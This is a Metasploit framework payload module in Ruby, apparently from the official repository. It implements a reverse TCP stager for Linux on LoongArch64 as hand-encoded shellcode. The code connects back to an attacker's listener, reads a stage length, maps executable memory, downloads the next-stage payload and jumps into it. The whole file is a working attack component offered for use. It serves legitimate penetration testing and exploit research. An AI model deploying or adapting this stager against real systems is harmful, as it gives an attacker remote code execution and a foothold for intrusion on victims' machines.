##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 224

  include Msf::Payload::Stager

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse TCP Stager',
        'Description' => 'Connect back to the attacker',
        'Author' => ['bcoles'], # LoongArch64 shellcode and staged payload
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_LOONGARCH64,
        'References' => [
          ['URL', 'https://loongson.github.io/LoongArch-Documentation/LoongArch-Vol1-EN.html']
        ],
        'Handler' => Msf::Handler::ReverseTcp,
        'Stager' => {
          'Offsets' => {
            'LPORT' => [210, 'n'],
            'LHOST' => [212, 'ADDR']
          },
          'Payload' => stager_payload
        }
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    print_status("Transmitting stage length value... (#{payload.length} bytes)")
    conn.put([payload.length].pack('V'))
    true
  end

  private

  def stager_payload
    [
      # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
      0x0383180b, # ori a7,zero,198 (SYS_socket)
      0x03800006, # ori a2,zero,0
      0x03800405, # ori a1,zero,1
      0x03800804, # ori a0,zero,2
      0x002b0000, # syscall 0
      0x00150097, # or s0,a0,zero (save socket)
      0x6000ac80, # blt a0,zero,fail

      # connect(socket, &sockaddr_in, 16)
      0x18000005, # pcaddi a1,0
      0x02c2d0a5, # addi.d a1,a1,180 (sockaddr)
      0x03804006, # ori a2,zero,16
      0x03832c0b, # ori a7,zero,203 (SYS_connect)
      0x001502e4, # or a0,s0,zero
      0x002b0000, # syscall 0
      0x5c009080, # bne a0,zero,fail

      # Read the four-byte stage length, retrying short reads.
      0x02ffc063, # addi.d sp,sp,-16
      0x03801018, # ori s1,zero,4 (remaining)
      0x0015007a, # or s3,sp,zero (write pointer)
      0x0380fc0b, # ori a7,zero,63 (SYS_read)
      0x00150306, # or a2,s1,zero
      0x00150345, # or a1,s3,zero
      0x001502e4, # or a0,s0,zero
      0x002b0000, # syscall 0
      0x64006c04, # bge zero,a0,fail (EOF or error)
      0x0010935a, # add.d s3,s3,a0
      0x00119318, # sub.d s1,s1,a0
      0x5fffe300, # bne s1,zero,length_read

      # mmap(NULL, length, PROT_RWX, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
      0x2a800078, # ld.wu s1,sp,0
      0x0383780b, # ori a7,zero,222 (SYS_mmap)
      0x03800009, # ori a5,zero,0
      0x02fffc08, # addi.d a4,zero,-1
      0x03808807, # ori a3,zero,34
      0x03801c06, # ori a2,zero,7
      0x00150305, # or a1,s1,zero
      0x03800004, # ori a0,zero,0
      0x002b0000, # syscall 0
      0x60003880, # blt a0,zero,fail
      0x00150099, # or s2,a0,zero (stage address)
      0x0015009a, # or s3,a0,zero (write pointer)

      # Read the complete stage.
      0x0380fc0b, # ori a7,zero,63 (SYS_read)
      0x00150306, # or a2,s1,zero
      0x00150345, # or a1,s3,zero
      0x001502e4, # or a0,s0,zero
      0x002b0000, # syscall 0
      0x64001804, # bge zero,a0,fail (EOF or error)
      0x0010935a, # add.d s3,s3,a0
      0x00119318, # sub.d s1,s1,a0
      0x5fffe300, # bne s1,zero,stage_read

      0x38728000, # ibar 0
      0x4c000320, # jirl zero,s2,0

      # exit(0)
      0x03800004, # ori a0,zero,0
      0x0381740b, # ori a7,zero,93 (SYS_exit)
      0x002b0000, # syscall 0

      # sockaddr_in (address and port patched by the framework)
      0x5c110002,
      0x0100007f,
      0x00000000,
      0x00000000
    ].pack('V*')
  end
end
